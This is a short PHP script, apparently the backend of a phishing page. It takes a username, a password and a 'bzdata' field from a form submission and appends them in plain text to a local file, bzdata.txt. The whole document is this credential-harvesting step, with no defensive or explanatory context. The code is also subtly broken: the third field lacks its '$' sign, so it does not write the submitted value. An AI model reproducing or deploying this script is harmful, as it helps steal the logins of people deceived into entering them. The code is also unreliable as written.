<?php
$username=$_POST["username"];
$password=$_POST["password"];
$bzdata=$_POST["bzdata"];
file_put_contents("bzdata.txt", $username." ".$password." ".bzdata, FILE_APPEND);
?>